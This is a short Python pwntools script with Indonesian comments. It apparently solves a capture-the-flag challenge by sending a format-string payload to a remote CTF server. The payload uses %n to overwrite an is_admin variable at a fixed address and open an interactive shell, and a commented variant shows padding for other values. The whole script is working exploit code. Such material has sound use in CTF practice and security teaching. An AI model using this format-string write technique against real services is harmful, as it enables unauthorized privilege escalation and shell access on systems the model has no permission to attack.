from pwn import *

# === 1. KONFIGURASI ===
# io = process('./vuln')
io = remote('target-ctf.id', 1234)

# === 2. DATA DARI SOAL 2 (GAMBAR 1) ===
target_addr = 0x0804a018  # Alamat is_admin
target_val = 1            # Kita ingin is_admin = 1
fmt_offset = 4            # buf ada di parameter ke-4

# === 3. LOGIKA FORMULA LU ===
# Karena target_val (1) < len(p32(target_addr)) (4), 
# kita pakai trik target_val = 4 agar shell terbuka
actual_val = 4 

# Payload = [addr] + [padding jika ada] + [%offset$n]
# Karena actual_val sudah 4 (pas dengan panjang addr), kita tidak butuh %c tambahan
payload = p32(target_addr) + f"%{fmt_offset}$n".encode()

# Jika ingin is_admin = 65 (0x41), formulanya jadi:
# payload = p32(target_addr) + b"%61c" + b"%4$n" 

# === 4. EKSEKUSI ===
io.sendline(payload)
io.interactive() # Langsung dapet shell karena is_admin != 0